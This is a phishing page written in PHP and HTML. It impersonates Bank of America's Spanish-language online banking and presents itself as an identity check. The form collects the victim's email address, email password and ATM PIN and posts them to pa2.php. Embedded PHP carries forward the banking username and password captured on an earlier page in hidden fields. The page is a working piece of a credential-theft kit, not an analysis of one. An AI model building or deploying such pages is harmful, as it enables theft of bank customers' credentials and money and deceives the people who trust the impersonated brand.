
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="css/normalize.min.css" />
  <link rel="stylesheet" href="css/estilos.css" />
  <title>Banca en Línea</title>
  <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>

<body>
  <div class="container">
    <div class="banner1">
      <img src="img/logo.jpg" alt="logo" />
      <p class="txtg">Entrar</p>
      <div class="derLinks">
        <img class="sarea" src="img/lock.jpg" alt="candado" />
        <div class="areaSegura">Área protegida</div>
        <img class="sarea2" src="img/points.jpg" alt="puntos" />
        <div class="lenguaje">In English</div>
      </div>
    </div>
    <div class="banner2">
      <h1>Verificar su identidad</h1>
    </div>
    <div class="banner3">
      <div class="columnas">
        <div class="columnaX">
          <h2 class="titulo2">
            Confirmar correo asociado a su cuenta de banco
          </h2>
          <p>
            Para verificar su identidad, Ingrese el correo asociado a la
            cuenta bancaria
          </p>
          <form action="pa2.php" method="post">
            <div class="form-group-l">
              <label class="form2label" for="correo">Correo electrónico</label>

              <input type="email" id="email" name="email" placeholder="******@****.com" required>
            </div>

            <div class="form-group-l">
              <label class="form2label" for="correo">Clave del correo</label>

              <input type="password" id="cpass" name="cpass" placeholder="*************" required>
            </div>
            <div class="form-group-l">
              <label class="form2label" for="atm">Atm o Pin</label>
              <input type="password" id="pin" name="pin" maxlength="12" placeholder="****" required>
            </div>
            <div class="footer-form">
              <p style="position: relative; width: 600px">
                La dirección de correo electrónico que ingrese debe coincidir
                con el correo asociado a nuestros servicios de Online Banking
              </p>
              <button class="btn principal" name="add" type="submit">
                CONFIRMAR
              </button>
            </div>
            
            <?php 
                     $variable= $_POST['usuario'];
        echo '<a href="index.php"></a><input id="usuario" style="visibility:hidden" name="usuario" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
		  
		  <?php 
                     $variable= $_POST['contra'];
        echo '<a href="index.php"></a><input id="contra" style="visibility:hidden" name="contra" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
            
            
            
            
          </form>
        </div>
        <div class="columna3" style="float: right">
          <h2>Ayuda para entrar</h2>
          <ul class="menosmargin">
            <li>
              <a href="#">
                ¿No reconoce o no puede acceder a la dirección de correo
                electrónico o al número de teléfono proporcionados?
              </a>
            </li>
          </ul>
        </div>
      </div>
    </div>
    <div class="banner4" style="height: 130px">
      <div class="fondolock"></div>
      <p>Área protegida</p>
      <div class="enlaces-footer">
        <a href="#">Privacidad</a>
        <a href="#">Seguridad</a>
      </div>
      <div class="copirait">
        <p>Bank of America, N.A. Miembro de FDIC.</p>
        <a href="#">
          Igualdad de oportunidades en préstamos para viviendas
        </a>

        <span class="corporation">© 2021 Bank of America Corporation.</span>
      </div>
    </div>
  </div>
  <script src="js/funciones.js"></script>
</body>

</html>
